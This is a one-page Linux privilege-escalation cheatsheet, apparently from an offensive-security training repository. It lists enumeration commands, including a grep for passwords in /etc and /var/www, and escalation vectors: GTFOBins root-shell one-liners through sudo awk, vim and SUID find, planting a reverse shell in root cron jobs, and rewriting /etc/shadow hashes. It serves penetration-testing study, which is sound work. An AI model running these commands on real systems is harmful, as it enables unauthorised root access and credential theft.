<!-- SPDX-License-Identifier: GPL-3.0-or-later | Copyright (C) 2026 Nithees Narendra S -->
[Home](../README.md) › [Cheatsheets](README.md) › **Linux Privilege Escalation Cheatsheet**

# Linux Privilege Escalation Cheatsheet

> Enumeration commands and escalation vectors in one page. Printable: use your browser's *Print → Save as PDF*.

_Domain: Offensive · Last updated 2026-08-13_

## Quick reference

This cheatsheet is a fast recall aid, not a tutorial — learn the concepts in the Manual, then keep this beside you while you work.

## Automated enumeration
`./linpeas.sh` · `lse.sh -l1` · `linenum.sh` — run first, then verify findings by hand.

## Manual triage
| Check | Command |
| --- | --- |
| Sudo rights | `sudo -l` |
| SUID binaries | `find / -perm -4000 -type f 2>/dev/null` |
| Capabilities | `getcap -r / 2>/dev/null` |
| Cron jobs | `cat /etc/crontab; ls -la /etc/cron.*` |
| Writable paths in $PATH | `echo $PATH` + check each dir |
| Kernel | `uname -a` (map to known exploits) |
| Interesting files | `find / -writable -type d 2>/dev/null` |
| Creds in files | `grep -rn "password" /etc /var/www 2>/dev/null` |

## Common vectors
- **Sudo misconfig** — `sudo -l` shows a binary; check [GTFOBins](https://gtfobins.github.io) for a shell escape.
- **SUID GTFOBins** — e.g. `find . -exec /bin/sh -p \; -quit` if `find` is SUID.
- **Writable cron/script** run by root → drop a reverse shell.
- **Weak file perms** on `/etc/passwd` or `/etc/shadow` → add/replace a root hash.
- **PATH hijack** on a root-run script that calls a binary by name.
- **Capabilities** — `cap_setuid+ep` on a binary → set uid 0.
- **Docker/lxd group** membership → mount host FS as root.

## GTFOBins pattern (sudo)
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo vim -c ':!/bin/sh'
```

## Related

- [All cheatsheets](README.md)
- [Tools reference](../reference/tools/README.md)
- [Repository home](../README.md)

